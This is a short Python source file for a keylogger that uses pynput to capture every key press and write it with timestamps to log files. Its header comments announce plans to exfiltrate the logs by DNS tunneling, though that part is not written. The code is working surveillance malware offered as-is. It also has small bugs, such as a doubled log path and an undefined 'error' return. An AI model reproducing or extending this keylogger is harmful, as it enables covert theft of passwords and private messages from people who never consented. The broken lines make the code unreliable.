#keylogging with python
#dns tunneling with python
#compliled all logged data into days-mm-yyyy.txt
#tunnel data out

import logging
import os
from pynput.keyboard import Key, Listener
from datetime import datetime

class Keylogger:
	#directory function 
	def checkDir(self):
		cwd = os.getcwd()  
		path_log = cwd + "/log"
		# Add 'r' in starting of path:

		# path = r"D:\Folder\file.txt"


		# def create_log_directory(self):
        # sub_dir = "log"
        # cwd = os.getcwd()
        # self.log_dir = os.path.join(cwd,sub_dir)
		if (os.path.exists(path_log) == False):
			#if false make the folder
			try:
				#https://www.geeksforgeeks.org/create-a-directory-in-python/#makedirs
				os.mkdir(path_log)
				self.log_dir = os.path.join(cwd + path_log)
			except:
				return(error)
		else:	
			self.log_dir = os.path.join(cwd + path_log)

	@staticmethod
	def on_press(key):
		try:
			logging.info(str(key))
		except Exception as e:
			logging.info(e)

	def writeLog(self):
        # time format example: '2021-05-29-171747'
		time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        # logging info in the file
		logging.basicConfig(
			filename=(os.path.join(self.log_dir, time) + "-log.txt"),
			level=logging.DEBUG, 
			format= '[%(asctime)s]: %(message)s',)

		with Listener(on_press=self.on_press) as listener:
			listener.join()

if  __name__ == "__main__":
	klog = Keylogger()
	klog.checkDir()
	klog.writeLog()
